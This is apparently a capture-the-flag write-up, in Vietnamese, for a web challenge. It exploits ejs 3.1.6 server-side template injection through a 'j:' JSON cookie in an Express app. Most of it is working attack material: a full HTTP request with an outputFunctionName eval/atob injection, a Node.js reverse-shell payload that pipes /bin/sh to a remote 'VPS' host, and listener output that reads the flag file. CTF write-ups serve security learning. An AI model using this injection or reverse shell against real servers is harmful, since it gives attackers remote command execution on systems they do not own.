# Solution

- Nodejs nếu ta truyền cookie ở dạng `j:{}` thì sau khi parse sẽ được một object
- ejs version 3.1.6 bị dính lỗi và có thể dấn đến RCE: <https://eslam.io/posts/ejs-server-side-template-injection-rce/>

HTTP request:

```
GET / HTTP/1.1
Host: jwtdecoder.sstf.site
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: jwt=j:{"settings":{"view options":{"outputFunctionName": "x%3beval(atob('<BASE ENCODE PAYLOAD>'))%3bs"}}}
If-None-Match: W/"711-lSeOr/4NNWw9/rKGxE5tnvF4xJI"
Connection: close
```

PAYLOAD
```
(function(){
	var x = global.process.mainModule.require
    var net = x("net"),
        cp = x("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(PORT, "VPS", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

Kết quả

```bash
Listening on 0.0.0.0 1337
Connection received on 3.36.5.38 35678
ls
app.js
node_modules
package-lock.json
package.json
view

cat /flag.txt
SCTF{p0pul4r_m0dule_Ar3_n0t_4lway3_s3cure}
```